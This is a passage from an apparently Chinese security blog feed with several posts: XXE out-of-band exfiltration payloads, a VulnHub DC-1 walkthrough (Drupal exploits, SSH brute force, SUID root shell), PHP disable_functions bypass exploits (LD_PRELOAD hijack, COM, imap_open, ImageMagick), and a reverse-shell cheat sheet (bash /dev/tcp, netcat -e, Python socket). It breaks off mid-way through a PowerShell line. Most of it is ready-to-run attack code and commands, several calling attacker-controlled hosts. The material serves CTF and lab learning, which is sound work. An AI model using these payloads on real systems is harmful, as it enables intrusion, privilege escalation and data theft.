class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;you_vps&#x2F;xml.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p><strong>通过引入本地文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;send;</span><br><span class="line">    &#39;&gt; </span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>CoogleCTF上的一道题：<a href="https://bnv.web.ctfcompetition.com/">链接</a>    <a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">writeup</a></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#39;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>还不太懂！！！！</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>使用开发语言提供的禁用外部实体的方法<br>PHP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>Libxml2.9.0 以后 ，默认不解析外部实体</p><p>JAVA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure><p>过滤用户提交的XML数据</p><p>过滤关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code></p><p>参考：<br><a href="https://xz.aliyun.com/t/3357">好文，作者有心了！！！</a></p><p><a href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub之DC-1靶机</title>
      <link href="2019/12/12/vulnhub-dc-1/"/>
      <url>2019/12/12/vulnhub-dc-1/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要记录一下玩VulnHub上的DC-1靶机的过程！！！</p><a id="more"></a><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>本地配好环境，这里网络连接我用的是NAT方式</p><p><strong>靶机：</strong>192.168.17.149</p><p><strong>kali：</strong>192.168.17.146</p><p>事先不知道ip的话可以先用arp-scan扫一下</p><pre><code>arp-scan --interface=eth0 --localnet</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191212224352.png"></p><p>nmap扫下看开放了哪些端口</p><p><img src="/2019/12/12/vulnhub-dc-1/20191212225050.png"></p><p>80端口开放，访问以下网站</p><p><img src="/2019/12/12/vulnhub-dc-1/20191212225147.png"></p><p>看到是Drupal的cms，打开msf，search一下，用最新的<code>exploit(unix/webapp/drupal_drupalgeddon2)</code>，成功返回meterpreter，进入shell，执行命令进入一个标准的shell，ls得到flag1，查看内容</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191212225948.png"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>提示让我们看配置文件，搜一下配置文件位置<code>/sites/default/settings.php</code></p><p>得到flag2和数据库账号密码</p><p><img src="/2019/12/12/vulnhub-dc-1/20191212230758.png"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>登陆一下mysql</p><pre><code>mysql -h localhost -u dbuser -p</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213133233.png"></p><p>查看drupaldb里users表里的内容</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213135445.png"></p><p>有两种方法：</p><p><strong>方式1：</strong></p><p>用同样的加密方式加密一个我们知道的密钥，然后update数据库修改原密码，在Drupal7项目所在的目录用以下命令即可获得加密结果</p><pre><code>php scripts/password-hash.sh admin</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213140253.png"></p><p>然后再数据库里更新</p><pre><code>update users set pass=&quot;$S$DsBR4rNeiIzheuLDAdLE932hUtDgoeE6BFmP2oRifCt.4piniN7u&quot; where name=&quot;admin&quot;;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213141024.png"></p><p>登陆一下，在Dashboard发现flag3，提示我们passwd</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213141259.png"></p><p><strong>方式2：</strong></p><p>查看下Drupal的版本，<code>includes/bootstrap.inc</code>是默认的版本信息</p><pre><code>cat /var/www/includes/bootstrap.inc | grep VERSION</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213142543.png"></p><p>可以看到是7.24的版本，searchsploit搜索一下</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213143008.png"></p><p>发现好像有sql注入漏洞，直接用<code>exp(/usr/share/exploitdb/exploits/php/webapps/34992.py)</code></p><pre><code>python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.17.149/ -u moonback -p moonback</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213143624.png"></p><p>我们就成功创建一个和admin一样的用户，其他的exp应该也可以用，没有测试</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>跟着flag3的提示，看看<code>/etc/passwd</code>吧，找到flag4，存在flag4用户</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213144626.png"></p><p>会不会是弱口令？用hydra爆破一下吧</p><pre><code>hydra -l flag4 -P /root/Desktop/字典/pass.txt ssh://192.168.17.149 -t 64</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213150235.png"><br>最后爆破出来的是orange，ssh登上,得到flag4，提示下一个flag在<code>/root</code>目录下</p><p><img src="/2019/12/12/vulnhub-dc-1/20191213150425.png"></p><h2 id="thefinalflag"><a href="#thefinalflag" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>提权吧！提示也给了用find提权（suid提权）</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;     #查看具有root用户权限的SUID文件</code></pre><p>发现find命令在里面，suid提权的大概意思就是：如果命令以SUID权限运行，所有通过该命令执行的命令都会以root权限运行</p><pre><code>find /etc/passwd -exec whoami \;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213151722.png"></p><p>所以我们直接让它弹个root的shell</p><pre><code>find /etc/passwd -exec /bin/sh \;</code></pre><p><img src="/2019/12/12/vulnhub-dc-1/20191213152233.png"></p><p>成功通关！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> 靶机 </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过php部分配置</title>
      <link href="2019/11/29/bypass-php-ini/"/>
      <url>2019/11/29/bypass-php-ini/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了绕过一些php配置的方法！</p><a id="more"></a><h2 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h2><p>顾名思义，<code>disable_functions</code>即不能使用的php函数</p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><code>LD_PRELOAD</code>是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号</p><p>php的<code>mail()</code>函数在执行过程中会默认调用系统程序<code>/usr/sbin/sendmail</code>，而<code>/usr/sbin/sendmail</code>会调用<code>getuid()</code>。如果我们能通过LD_PRELOAD的方式来劫持<code>getuid()</code>，再用<code>mail()</code>函数来触发sendmail程序进而执行被劫持的<code>getuid()</code>，从而就能执行恶意代码了</p><p>捋下思路：</p><ol><li>编写一个原型为 <code>uid_t getuid(void);</code> 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 <code>evil.so</code></li><li>运行 PHP 函数 <code>putenv()</code>，设定环境变量 <code>LD_PRELOAD</code> 为 <code>evil.so</code>，以便后续启动新进程时优先加载该共享对象</li><li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 <code>/usr/sbin/sendmail</code>，由于上一步 <code>LD_PRELOAD</code> 的作用，<code>sendmail</code> 调用的系统函数 <code>getuid()</code> 被优先级更好的 <code>evil.so</code> 中的同名 <code>getuid()</code> 所劫持</li><li>达到不调用 PHP 的各种命令执行函数（<code>system()</code>、<code>exec()</code> 等等）仍可执行系统命令的目的</li></ol><p>怎样编写一个共享库文件呢？</p><p>编写<code>test.c</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int geteuid() &#123;</span><br><span class="line">        const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">        if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">        unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">        system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成共享库文件：</p><pre><code>gcc -shared -fPIC test.c -o test.so</code></pre><p>绕过<code>disable_functions</code> github上有个项目</p><p>EXP地址：<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p><p>这里面的仓库里有编译生成好的共享库文件，可以直接使用，通过设置<code>EVIL_CMDLINE</code>来执行系统命令</p><p>php利用代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);&#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);&#x2F;&#x2F;用mail函数触发</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这上面有道题（RCE me）我用的就是用的这种方法<a href="http://www.moonback.xyz/2019/11/06/syc-ctf-wp/">http://www.moonback.xyz/2019/11/06/syc-ctf-wp/</a></p><h3 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h3><p>需要php配置里开启com.allow_dcom，在php/ext/里面查找是否存在php_com_dotnet.dll这个文件</p><pre><code>extension=php_com_dotnet.dllcom.allow_dcom = true</code></pre><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制</p><h3 id="imap-open-CVE-2018-19518"><a href="#imap-open-CVE-2018-19518" class="headerlink" title="imap_open(CVE-2018-19518)"></a>imap_open(CVE-2018-19518)</h3><p>在php.ini中开启<code>imap.enable_insecure_rsh</code>选项为On</p><p>具体原理参见这位大佬的博客：<a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x07-%E5%88%A9%E7%94%A8imap-open-%E7%BB%95%E8%BF%87">https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#0x07-利用imap-open-绕过</a></p><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!function_exists(&#39;imap_open&#39;)) &#123;</span><br><span class="line">        die(&quot;no imap_open function!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &quot;|base64\t-d|sh&#125;&quot;;</span><br><span class="line">&#x2F;&#x2F;$server &#x3D; &#39;x -oProxyCommand&#x3D;echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &#39;|base64$IFS$()-d|sh&#125;&#39;;</span><br><span class="line">imap_open(&#39;&#123;&#39; . $server . &#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F; or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="line">sleep(5);</span><br><span class="line">echo file_get_contents(&quot;&#x2F;tmp&#x2F;cmd_result&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><p>这里直接上EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;</span><br><span class="line">$command &#x3D; isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#39;id&#39;;</span><br><span class="line">echo &quot;Run command: $command\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;;</span><br><span class="line">$data_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);</span><br><span class="line">$imagick_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);</span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;image.jpg&quot;|$command&gt;$data_file&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line">file_put_contents(&quot;$imagick_file&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&quot;$imagick_file&quot;);</span><br><span class="line">$thumb-&gt;writeImage(tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;));</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">echo file_get_contents($data_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="bypass-allow-url-include"><a href="#bypass-allow-url-include" class="headerlink" title="bypass allow_url_include"></a>bypass allow_url_include</h2><p><code>all_url_include</code>即是否允许远程包含，默认关闭</p><h3 id="SMB服务"><a href="#SMB服务" class="headerlink" title="SMB服务"></a>SMB服务</h3><p>安装SAMBA服务器</p><pre><code>apt-get install samba</code></pre><p>创建共享目录</p><pre><code>mkdir /smbchmod 0555 /smb/chown -R nobody:nogroup /smb/</code></pre><p>配置SAMBA服务器配置文件</p><pre><code>echo &gt; /etc/samba/smb.conf</code></pre><p>其中写入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup &#x3D; WORKGROUP</span><br><span class="line">server string &#x3D; Samba Server %v</span><br><span class="line">netbios name &#x3D; indishell-lab</span><br><span class="line">security &#x3D; user</span><br><span class="line">map to guest &#x3D; bad user</span><br><span class="line">name resolve order &#x3D; bcast host</span><br><span class="line">dns proxy &#x3D; no</span><br><span class="line">bind interfaces only &#x3D; yes</span><br><span class="line"></span><br><span class="line">[ethan]</span><br><span class="line">path &#x3D; &#x2F;smb</span><br><span class="line">writable &#x3D; no</span><br><span class="line">guest ok &#x3D; yes</span><br><span class="line">guest only &#x3D; yes</span><br><span class="line">read only &#x3D; yes</span><br><span class="line">directory mode &#x3D; 0555</span><br><span class="line">force user &#x3D; nobody</span><br></pre></td></tr></table></figure><p>重启服务</p><pre><code>service smbd restart </code></pre><p>访问就可以通过<code>\\192.168.23.129\ethan\shell.php</code></p><h3 id="Webdav"><a href="#Webdav" class="headerlink" title="Webdav"></a>Webdav</h3><p>可以在docker里搭一个</p><pre><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 8000:80 --rm --name webdav bytemark/webdav</code></pre><p>然后把php文件放到<code>/root/webdav/data/</code>里面，包含<code>//ip:8000//webdav/shell.php</code>就行</p><h2 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h2><p><code>open_basedir</code>即用来对用户访问文件的活动范围限制在指定的区域</p><p>具体内容可以参见大佬的博客<a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/</a></p><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><h3 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h3>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell和反弹shell</title>
      <link href="2019/11/27/reverse-shell/"/>
      <url>2019/11/27/reverse-shell/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了shell和反弹shell的一些常见方法以及如何在shell下载文件！</p><a id="more"></a><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>什么是反弹shell？</p><p>反弹shell，即reverse shell，一般情况下指在本地的命令行的输入输出转到控制端得以执行。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p><p>但这种有局限性：</p><ol><li><p>如果被控端再内网中，不能直接连接</p></li><li><p>防火墙的限制</p></li></ol><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>就是控制端监听在某TCP/UDP端口，被控制端主动连接控制端的这一端口，控制端可以通过这一端口进行相关命令操作。</p><p>反向shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形，同时也实现了被控端的精准控制（指定了被控制端的IP，除此之外的是无法和被控端无法连接）。</p><p>下面的例子主要是反向反弹shell，以下的有些方法可将<code>/bin/bash</code>替换成<code>cmd.exe</code>用于windows反弹shell</p><h2 id="反弹shell-2"><a href="#反弹shell-2" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><ol><li><p><code>bash -i</code>   打开一个交互的bash</p></li><li><p><code>&gt;&amp;</code>   将标准错误输出重定向到标准输出</p></li><li><p><code>/dev/tcp/x.x.x.x/port</code>   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</p></li><li><p><code>0&gt;&amp;1</code>   标准输入重定向到标准输出，实现你与反弹出来的shell的交互</p></li></ol><p>注：<code>/dev/tcp/</code> 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在<code>/dev/udp/</code>。</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>Linux中nc命令是一个功能强大的网络工具，全称是netcat</p><p>选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：在线帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure><p>常用的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">被控端：nc 192.168.31.174 8080 -t -e &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.174）</span><br><span class="line"></span><br><span class="line">控制端：nc -lvp 8080</span><br><span class="line"></span><br><span class="line">使用监听模式监听8080端口，并显示命令执行过程</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>如果目标机器上有pty模块，可以直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object 